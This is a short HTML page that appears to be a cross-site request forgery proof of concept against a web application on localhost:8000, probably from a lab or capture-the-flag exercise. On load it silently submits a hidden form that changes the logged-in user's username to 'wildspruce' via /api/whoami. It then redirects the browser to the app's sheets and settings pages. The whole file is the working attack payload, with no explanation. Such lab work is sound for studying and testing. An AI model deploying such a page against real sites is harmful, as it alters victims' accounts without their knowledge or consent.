<!DOCTYPE html>
<html>
<head>
  <title>Redirect</title>
</head>
<body>
  <iframe name="hiddenFrame" style="display:none;"></iframe>
  <form id="postForm" method="POST" action="http://localhost:8000/api/whoami" target="hiddenFrame">
    <input type="hidden" name="new_username" value="wildspruce">
  </form>
  
  <script>
      setTimeout(() => {
      window.location.href = "http://localhost:8000/#/sheets";
    }, 1000);
      
    document.getElementById('postForm').submit();
    
    // Переход на #/settings через 1 секунду
    setTimeout(() => {
      window.location.href = "http://localhost:8000/#/settings";
    }, 2000);
  </script>
</body>
</html>
